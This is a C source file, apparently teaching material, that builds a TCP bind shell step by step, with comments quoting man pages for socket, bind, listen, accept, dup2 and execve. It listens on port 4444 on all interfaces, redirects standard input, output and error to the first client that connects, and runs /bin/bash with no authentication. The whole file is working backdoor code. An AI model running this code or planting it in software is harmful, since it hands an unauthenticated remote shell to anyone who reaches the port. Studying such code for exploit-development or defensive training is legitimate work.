// Optional requirement for the socket function. Include sys/types for application portability and old BSD implementations.
#include <sys/types.h>
// Requirement for the socket function and sockaddr_in struct.
#include <sys/socket.h>
// netinet/in.h & netinet/ip.h are required for sockaddr_in. Included both reduces compilation errors in the future.
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>



int main(void)
{
	// Create an IPv4 Socket - see manual page socket with command "man socket" for full details.
	// 	int socket(int domain, int type, int protocol);
	// 	 int domain		= AF_INET		// IPv4 Internet protocols
	//	 int type		= SOCK_STREAM	// Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
	//	 int protocol	= 0				// The protocol to be used with the socket. Normally there is only one protocol
										// per socket type. In this case the protocol value is 0.
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	
	// Create the IP Socket Address (IP + TCP Port Number) - see "man 7 ip" for full details.
	//  An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
	//  struct sockaddr_in {
    //    	sa_family_t    sin_family; // address family: AF_INET 
    //    	in_port_t      sin_port;   // port in network byte order. See "man htons".  
    //    	struct in_addr sin_addr;   /* internet address */
    //    };
	// This is the struct for the internet address "in_addr" which is needed for the struct above "sockaddr_in".
    //   struct in_addr {
    //   	uint32_t       s_addr;     /* address in network byte order */
    //   };
	struct sockaddr_in ipSocketAddr = { 
        .sin_family = AF_INET, 
        .sin_port = htons(4444), 
        .sin_addr.s_addr = htonl(INADDR_ANY) 
    };
	// "man htons" The htons() function converts an unsigned short integer hostshort from host byte order to network byte order.
	// "man htonl" - The htonl() function converts the unsigned integer hostlong from host byte order to network byte order.

	// Bind the previously created Socket to the IP-Socket Address declared above. See "man 2 bind" for full details.
	//        int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); 

	// Listen for incoming TCP connects on port 4444 - see "man 2 listen" for full details.
	//  int listen(int sockfd, int backlog);
	listen(ipv4Socket, 0);

	// Accept incoming connection - see "man 2 accept" for full details.
	//  the accept function takes the connection request from the listen function and creates a new connected socket.
	//	int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	int clientSocket = accept(ipv4Socket, NULL, NULL);

	// Duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected Socket. See "man 2 dup2" for full details.
	//  int dup2(int oldfd, int newfd);	
	dup2(clientSocket, 0);
	dup2(clientSocket, 1);
	dup2(clientSocket, 2);
	
	// In the newly created socket, execute a shell. - See "man 2 execve" for full details.
	//  int execve(const char *filename, char *const argv[], char *const envp[]);
	execve("/bin/bash", NULL, NULL);

}	
